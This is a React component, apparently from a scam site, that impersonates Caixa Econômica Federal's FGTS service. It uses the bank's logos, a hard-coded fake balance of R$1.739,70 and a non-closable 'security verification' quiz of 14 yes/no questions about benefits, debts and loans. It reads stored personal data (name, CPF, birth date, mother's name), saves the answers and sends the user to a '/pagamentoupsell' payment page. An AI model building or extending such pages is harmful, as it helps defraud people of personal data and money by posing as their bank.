import { useState, useEffect } from "react";
import flogo from "../assets/f-logo.png"
import { BiDollar } from "react-icons/bi";
import fgts from "../assets/fgts2.png";
import caixa from "../assets/caixalogo.png";

import { FaAngleRight, FaExchangeAlt, FaInfo } from "react-icons/fa";
import Modal from "react-modal";
import { TbLockExclamation } from "react-icons/tb";
import logocaixa from "../assets/unnamed.png"
import { RiExchangeDollarFill } from "react-icons/ri";
import SecurityCheck from "../security/securityCheck";

// Estilo do Modal
const modalStyles: Modal.Styles = {
    content: {
        top: "50%",
        left: "50%",
        right: "auto",
        bottom: "auto",
        marginRight: "-50%",
        transform: "translate(-50%, -50%)",
        padding: "2rem",
        borderRadius: "12px",
        boxShadow: "0 4px 20px rgba(0, 0, 0, 0.2)",
        maxWidth: "90%",
        width: "400px",
        border: "none",
    },
    overlay: {
        backgroundColor: "rgba(0, 0, 0, 0.5)",
        padding: "20px",
    },
};

Modal.setAppElement("#root"); // Acessibilidade para o Modal

export function Perguntas() {
    const [, setLoadingData] = useState(true);
    const [isModalOpen,] = useState(true);
    const [currentQuestion, setCurrentQuestion] = useState(0);
    const [responses, setResponses] = useState({});



    const [userData, setUserData] = useState({
        nome: "Usuário",
        cpf: "",
        dataNascimento: "",
        nomeMae: "",
    });

    // Simulação do carregamento dos dados
    useEffect(() => {
        setTimeout(() => {
            const storedUserData = localStorage.getItem("userData");
            if (storedUserData) {
                setUserData(JSON.parse(storedUserData));
            }
            setLoadingData(false);
        }, 4000);
    }, []);

    const questions = [
        "Você recebe o Bolsa Família ou outro benefício social do governo?",
        "Já optou pelo Saque-Aniversário do FGTS?",
        "Está atualmente com algum empréstimo consignado em seu nome?",
        "Seu nome está negativado ou com restrição de crédito no SPC/Serasa?",
        "Você recebe algum tipo de auxílio previdenciário, como auxílio-doença ou aposentadoria?",
        "Você já utilizou o saldo do seu FGTS para algum tipo de financiamento, como a compra da casa própria?",
        "Possui algum financiamento ativo em seu nome, seja de veículo, imóvel ou outro bem?",
        "Você já fez ou está fazendo algum tipo de acordo para quitar dívidas ou renegociar crédito?",
        "Recebeu algum tipo de benefício emergencial do governo nos últimos 12 meses, como o auxílio de enfrentamento à pandemia?",
        "Você possui algum outro benefício assistencial, como o Auxílio Brasil ou outros programas sociais?",
        "Tem algum débito com o banco, como parcelas de cheque especial ou empréstimos não pagos?",
        "Já fez o saque de parte do seu FGTS em alguma emergência financeira?",
        "Você tem algum seguro de vida, empréstimo pessoal ou outro tipo de produto financeiro vinculado à sua conta na Caixa Econômica?",
        "Você está atualmente em algum processo de revisão de crédito ou reanálise de limite junto a uma instituição financeira?"
    ];


    // Função para salvar a resposta e avançar para a próxima pergunta
    const handleResponse = (answer: unknown) => {
        const updatedResponses = { ...responses, [questions[currentQuestion]]: answer };
        setResponses(updatedResponses);
        localStorage.setItem("questionnaireResponses", JSON.stringify(updatedResponses));

        if (currentQuestion < questions.length - 1) {
            setCurrentQuestion(currentQuestion + 1);
        } else {
            window.location.href = "/pagamentoupsell";
        }
    };

    return (
        <div className="w-screen h-screen flex flex-col items-center text-white mb-20">
            <header className="flex w-full flex-col p-4 space-y-8 bg-[#025bab] pb-8">
                <div className="flex items-center justify-between w-full">
                    <div className="flex items-center space-x-3">
                        <img width={34} src={caixa} alt="logo" />
                        <span className="text-white font-extralight">Olá, {userData.nome.split(" ")[0]}</span>
                    </div>
                    <img src={fgts} alt="fgts" width={65} />
                </div>

                <div className="flex flex-col space-y-3">
                    <div className="flex items-center space-x-2">
                        <div className="bg-orange-400 p-1 rounded-full w-fit">
                            <RiExchangeDollarFill size={30} />
                        </div>
                        <h2 className="font-bold text-xl">SALDO TOTAL</h2>
                    </div>

                    <div className="font-semibold text-3xl px-2">
                        R$1.739,70
                    </div>

                    <span className="border-b border-b-white" />
                </div>
            </header>

            <div className="rounded-lg bg-white w-full -mt-3">
                <div className="p-4 border-2 m-2 rounded-lg space-y-4">
                    <div className="flex items-center space-x-2 mb-4">
                        <div className="bg-orange-400 p-2 rounded-full w-fit">
                            <img src={flogo} alt="flogo" width={20} />
                        </div>
                        <h2 className="font-bold text-2xl text-zinc-700">
                            Resumo do seu FGTS
                        </h2>
                    </div>

                    <a className="" href="/saquedigital">
                        <div className="font-bold text-xl flex flex-col space-y-2">
                            <div className="flex items-center justify-between text-[#025bab]">
                                <h3>{userData?.nome.toUpperCase()}</h3>
                                <FaAngleRight />
                            </div>

                            <span className="text-zinc-700">R$1.739,70</span>
                        </div>
                    </a>
                    <span className="border-b border-b-zinc-800 my-2" />
                </div>
            </div>

            <div className="grid grid-cols-2 text-zinc-900 w-full gap-2 p-4">
                <a href="/saquedigital">
                    <div className="bg-orange-500 text-xl font-extralight text-white w-44 h-40 rounded-lg border-2 flex flex-col items-center text-center justify-center space-y-2">
                        <div className="bg-white p-2 text-orange-500 rounded-full w-fit">
                            <BiDollar />
                        </div>
                        <div>
                            Solicite seu saque <span className="font-bold">100% digital</span>
                        </div>
                    </div>
                </a>

                <div
                    className="cursor-pointer text-xl font-extralight text-[#025bab] w-44 h-40 rounded-lg border-2 flex flex-col items-center text-center justify-center space-y-2"
                >
                    <div className="bg-orange-500 p-2 text-white rounded-full w-fit">
                        <FaExchangeAlt />
                    </div>
                    <div>
                        <span className="font-bold">Conta bancária</span> para saque do
                        seu <span className="font-bold">FGTS</span>
                    </div>
                </div>

                <a href="/saquedigital">
                    <div className="text-xl font-extralight text-[#025bab] w-44 h-40 rounded-lg border-2 flex flex-col items-center text-center justify-center space-y-2">
                        <div className="bg-orange-500 p-2 text-white rounded-full w-fit">
                            <img src={flogo} alt="flogo" width={20} />
                        </div>
                        <div>
                            <span className="font-bold">Sistemática de saque </span> do seu
                            <span className="font-bold"> FGTS</span>
                        </div>
                    </div>
                </a>

                <a href="/info">
                    <div className="text-xl font-extralight text-[#025bab] w-44 h-40 rounded-lg border-2 flex flex-col items-center text-center justify-center space-y-2">
                        <div className="bg-orange-500 p-2 text-white rounded-full w-fit">
                            <FaInfo />
                        </div>
                        <div>
                            Informações <span className="font-bold">úteis</span>
                        </div>
                    </div>
                </a>
            </div>

            <SecurityCheck />

            {/* Modal para as Perguntas de Verificação de Segurança */}
            <Modal
                isOpen={isModalOpen}
                // onRequestClose={() => setIsModalOpen(false)}
                style={modalStyles}
                contentLabel="Verificação de Segurança"
            >

                <div className="w-full flex justify-center mb-6">
                    <img src={logocaixa} alt="logg" width={100} />

                </div>
                <div className="text-center w-full">
                    <div className="flex items-center w-full justify-center">
                        <TbLockExclamation className="text-orange-500 text-3xl" />
                        <h2 className="text-xl font-bold">Verificação de Segurança</h2>
                    </div>
                    <p className="text-xl text-zinc-500 mb-2">
                        Etapa {currentQuestion + 1} de {questions.length}
                    </p>
                    <p className="text-2xl my-4 text-zinc-700 mb-10 ">{questions[currentQuestion]}</p>

                    <div className="flex flex-col w-full justify-center mt-4 space-y-3">
                        <button
                            onClick={() => handleResponse("Sim")}
                            className="px-4 py-2 bg-orange-500 text-white rounded-md hover:bg-orange-600 w-full"
                        >
                            Sim
                        </button>
                        <button
                            onClick={() => handleResponse("Não")}
                            className="px-4 py-2 border border-primary  text-primary rounded-md  w-full"
                        >
                            Não
                        </button>
                    </div>

                </div>
            </Modal>
        </div>



    );
}
